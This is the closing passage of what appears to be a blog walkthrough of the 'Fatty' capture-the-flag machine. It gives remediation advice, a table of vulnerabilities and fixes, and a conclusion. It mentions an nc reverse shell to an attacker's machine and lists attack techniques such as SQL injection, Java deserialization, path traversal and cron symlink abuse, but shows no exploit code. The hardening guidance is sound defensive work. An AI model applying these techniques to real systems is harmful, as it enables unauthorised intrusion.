The container allows outbound connections (e.g., <code>nc</code> reverse shell to attacker&rsquo;s machine) and exposes sensitive ports (e.g., 1337) to the external network.</li><li><strong>Fix</strong>:<ul><li><strong>Configuration Fix</strong>:<ul><li>Configure Docker&rsquo;s network to use a private network namespace, restricting outbound connections to only necessary services (e.g., MySQL database).</li><li>Use a firewall (e.g., <code>iptables</code> or Docker&rsquo;s <code>--network</code> options) to block outbound connections except to whitelisted IPs/ports.</li><li>Expose only necessary ports (e.g., 1337) internally within the Docker network and use a reverse proxy with strict access controls for external access.</li></ul></li><li><strong>Source Code Fix</strong>: Not applicable, as this is a configuration issue with the Docker network.</li></ul></li></ul><hr><h3 id=summary-table-of-gaps-and-fixes>Summary Table of Gaps and Fixes<a href=#summary-table-of-gaps-and-fixes class=hanchor arialabel=Anchor>#</a></h3><table><thead><tr><th><strong>Service/System</strong></th><th><strong>Gap</strong></th><th><strong>Fix Type</strong></th><th><strong>Recommended Fix</strong></th></tr></thead><tbody><tr><td><strong>FTP (Port 21)</strong></td><td>Anonymous login allowed</td><td>Configuration</td><td>Disable anonymous access, restrict to authenticated users, remove sensitive files.</td></tr><tr><td><strong>Java Client</strong></td><td>Client-side access control</td><td>Source Code</td><td>Move role checks to server side, validate requests server-side.</td></tr><tr><td><strong>Java Client</strong></td><td>Hardcoded paths with weak LFI protection</td><td>Source Code</td><td>Sanitize paths, use whitelist for directories, normalize paths.</td></tr><tr><td><strong>Java Client</strong></td><td>Weak TLS validation</td><td>Source Code / Configuration</td><td>Implement certificate pinning, use trusted SSL certificates.</td></tr><tr><td><strong>Java Server</strong></td><td>SQL injection in login</td><td>Source Code / Configuration</td><td>Use prepared statements, restrict database permissions.</td></tr><tr><td><strong>Java Server</strong></td><td>Deserialization vulnerability</td><td>Source Code / Configuration</td><td>Avoid user-controlled deserialization, whitelist classes, disable unnecessary libraries.</td></tr><tr><td><strong>Java Server</strong></td><td>Weak path traversal sanitization</td><td>Source Code / Configuration</td><td>Strengthen path sanitization, restrict file system access, use chroot or container isolation.</td></tr><tr><td><strong>Java Server</strong></td><td>Hardcoded credentials</td><td>Source Code / Configuration</td><td>Use environment variables or secure vault, restrict file permissions.</td></tr><tr><td><strong>SSH (Port 22)</strong></td><td>Writable <code>authorized_keys</code></td><td>Configuration</td><td>Restrict file permissions, disable root login, limit SSH access by IP.</td></tr><tr><td><strong>Cron Job</strong></td><td>File overwrite via symbolic links</td><td>Source Code / Configuration</td><td>Validate tar contents, run as non-root, restrict file system access.</td></tr><tr><td><strong>Cron Job</strong></td><td>Insecure environment</td><td>Configuration</td><td>Use non-root user, restrict permissions, monitor file changes.</td></tr><tr><td><strong>Docker Container</strong></td><td>Overly permissive environment</td><td>Configuration</td><td>Use minimal image, read-only file system, drop capabilities, use seccomp.</td></tr><tr><td><strong>Docker Container</strong></td><td>Lack of network isolation</td><td>Configuration</td><td>Use private network, restrict outbound connections, limit exposed ports.</td></tr></tbody></table><hr><p>These fixes address the vulnerabilities exploited in the &ldquo;Fatty&rdquo; box, ensuring the services and systems are hardened against similar attacks. Implementing a combination of source code improvements and configuration changes will significantly enhance the security posture of the system.</p><h2 id=conclusion>Conclusion<a href=#conclusion class=hanchor arialabel=Anchor>#</a></h2><p>Fatty is an excellent machine that demonstrates the complexity of modern thick client applications and the interconnected nature of system vulnerabilities. It requires expertise in:</p><ul><li>Java thick client reverse engineering and modification</li><li>SQL injection techniques and privilege escalation</li><li>Java deserialization vulnerabilities and exploitation</li><li>Path traversal and local file inclusion attacks</li><li>Cron job manipulation and symlink attacks</li><li>Docker container security and privilege escalation</li></ul><p>The machine emphasizes the importance of proper input validation, secure coding practices, server-side security controls, and the principle of least privilege in both application design and system administration.</p><hr><p><em>This walkthrough covers the complete exploitation chain for educational purposes in authorized testing environments only.</em></p></div></div></article></div><footer class=footer><div class=footer__inner><div class=copyright><span>Â© 2025 Powered by <a href=https://gohugo.io>Hugo</a></span>
<span>:: <a href=https://github.com/panr/hugo-theme-terminal target=_blank>Theme</a> made by <a href=https://github.com/panr target=_blank>panr</a></span></div></div></footer><script type=text/javascript src=/bundle.min.js></script></div></body></html>